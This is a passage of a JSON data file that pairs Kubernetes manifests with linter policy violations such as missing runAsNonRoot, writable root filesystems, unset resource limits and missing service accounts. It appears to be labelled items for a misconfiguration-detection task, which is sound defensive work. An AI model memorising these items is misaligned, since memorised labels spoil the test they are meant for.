    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable TLS_SECRET_NAME in container \"proxy\" found"
  },
  {
    "id": "1740",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"proxy\" does not have a read-only root file system"
  },
  {
    "id": "1741",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kurl-proxy\" not found"
  },
  {
    "id": "1742",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "1743",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "mismatching-selector",
    "violation_text": "object has invalid label selector: values[0][app]: Invalid value: \"fb-user-datastore-api-{{ .Values.environmentName }}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "1744",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 10 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "1745",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fb-user-datastore-api-{{ .Values.environmentName }}\" does not have a read-only root file system"
  },
  {
    "id": "1746",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"formbuilder-user-datastore-{{ .Values.environmentName }}\" not found"
  },
  {
    "id": "1747",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fb-user-datastore-api-{{ .Values.environmentName }}\" has cpu request 0"
  },
  {
    "id": "1748",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fb-user-datastore-api-{{ .Values.environmentName }}\" has memory limit 0"
  },
  {
    "id": "1749",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"echo\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1750",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"echo\" does not have a read-only root file system"
  },
  {
    "id": "1751",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"echo\" is not set to runAsNonRoot"
  },
  {
    "id": "1752",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"echo\" has cpu request 0"
  },
  {
    "id": "1753",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"echo\" has memory limit 0"
  },
  {
    "id": "1754",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "1755",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ansibletest\" does not have a read-only root file system"
  },
  {
    "id": "1756",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"e2e\" not found"
  },
  {
    "id": "1757",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ansibletest\" is not set to runAsNonRoot"
  },
  {
    "id": "1758",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ansibletest\" has cpu request 0"
  },
  {
    "id": "1759",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ansibletest\" has memory limit 0"
  },
  {
    "id": "1760",
    "manifest_path": "data/manifests/the_stack_sample/sample_0355.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ingress-nginx\n  namespace: ingress-nginx\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  annotations:\n    service.beta.kubernetes.io/aws-load-balancer-type: nlb\nspec:\n  type: NodePort\n  selector:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  ports:\n  - name: http\n    port: 80\n    nodePort: 30080\n    targetPort: 80\n  - name: https\n    protocol: TCP\n    port: 443\n    nodePort: 30443\n    targetPort: 443\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:ingress-nginx app.kubernetes.io/part-of:ingress-nginx])"
  },
  {
    "id": "1761",
    "manifest_path": "data/manifests/the_stack_sample/sample_0358.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 